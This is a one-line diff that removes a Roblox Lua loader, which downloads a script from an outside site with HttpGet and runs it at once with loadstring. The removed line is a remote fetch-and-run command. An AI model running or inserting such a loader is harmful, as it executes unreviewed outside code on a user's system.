@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(("https://aizen.ml/uploads/wfs.txt")))()
